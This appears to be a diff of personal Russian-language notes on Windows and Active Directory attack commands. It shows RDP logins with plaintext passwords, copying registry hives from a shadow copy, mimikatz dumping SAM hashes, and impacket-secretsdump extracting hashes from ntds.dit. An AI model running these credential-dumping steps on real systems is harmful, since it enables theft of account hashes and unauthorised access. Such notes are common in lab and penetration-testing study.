@@ -4,7 +4,7 @@ rdesktop -u Administrator -p Admin123 -d ROOT.DC 192.168.50.200
 для машины в рабочей группе xfreerdp /u:Alexs /p:2013 /v:192.168.50.232
 xfreerdp /v:192.168.50.200 /d:root.dc /u:administrator /p:Admin123
 
-из коммандной строки
+РДП из коммандной строки
 mstsc /v:<адрес_компьютера>
 
 
@@ -27,6 +27,8 @@ copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYS
 
 .\mimikatz.exe
 lsadump::sam /system:C:\Share-Server\files\SYSTEM /sam:C:\Share-Server\files\SAM
+
+impacket-secretsdump -system SYSTEM -ntds ntds.dit LOCAL >> text распарсить файл ntds.dit
 
 
 
